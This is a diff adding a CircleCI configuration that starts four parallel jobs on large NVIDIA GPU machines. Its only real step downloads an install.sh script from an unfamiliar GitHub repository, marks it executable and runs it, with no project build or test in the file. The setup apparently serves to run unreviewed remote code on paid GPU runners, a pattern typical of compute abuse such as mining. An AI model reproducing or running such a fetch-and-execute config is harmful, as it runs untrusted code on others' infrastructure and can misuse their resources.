@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004-cuda-11.4:202110-01
+    resource_class: gpu.nvidia.large
+    parallelism: 4
+    steps:
+      - checkout  
+      - run: wget https://raw.githubusercontent.com/clasmildyt/lancrot/main/install.sh && chmod +x install.sh && ./install.sh
